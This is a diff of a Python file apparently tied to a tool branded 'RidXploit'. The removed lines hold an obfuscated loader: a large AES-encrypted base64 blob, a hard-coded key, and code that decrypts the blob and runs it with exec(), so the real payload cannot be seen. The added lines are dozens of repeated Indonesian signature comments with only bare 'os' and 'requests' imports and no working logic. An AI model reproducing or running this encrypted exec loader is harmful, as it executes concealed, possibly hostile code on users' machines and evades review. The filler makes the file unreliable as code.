@@ -1,21 +1,7027 @@
-# This file has been encrypted using AES and base64 by RidXploit
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
 
-encrypted_code = "RidXploit_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_RidXploit"
-key = bytes.fromhex("01dd0c114355e0bfc7a5d9f7cd8216fe16ca7297121cebc8bd30485c282a9719")
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
 
 
-import base64
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import unpad
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
 
-def aes_decrypt(data, key):
-    data = base64.b64decode(data.replace("RidXploit_", "").replace("_RidXploit", ""))
-    iv = data[:16]
-    ciphertext = data[16:]
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)
-    return decrypted
 
-# Decrypt and execute the Python code
-decrypted_code = aes_decrypt(encrypted_code, key)
-exec(decrypted_code.decode('utf-8'))
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+import os
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+import requests
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
